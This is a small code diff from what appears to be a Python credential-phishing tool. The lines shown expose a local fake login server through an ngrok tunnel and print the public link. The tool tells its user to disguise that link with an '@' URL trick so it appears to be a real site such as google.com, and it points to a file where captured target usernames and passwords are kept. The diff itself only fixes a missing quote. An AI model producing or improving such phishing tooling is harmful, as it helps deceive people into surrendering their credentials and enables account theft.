@@ -12,5 +12,5 @@ with open("server","w") as phplog:
 link=ngrok.connect(4040,"http")
 print(link)
 print(Fore.GREEN+" youcan send link :https://www.site.com-@yourlink for exampel my target site is google.com https://www.google.com-@ngrok ")
-print(Fore.GREEN+"user and pass target => cd wordpress/usernames.txt
+print(Fore.GREEN+"user and pass target => cd wordpress/usernames.txt")
 input("")
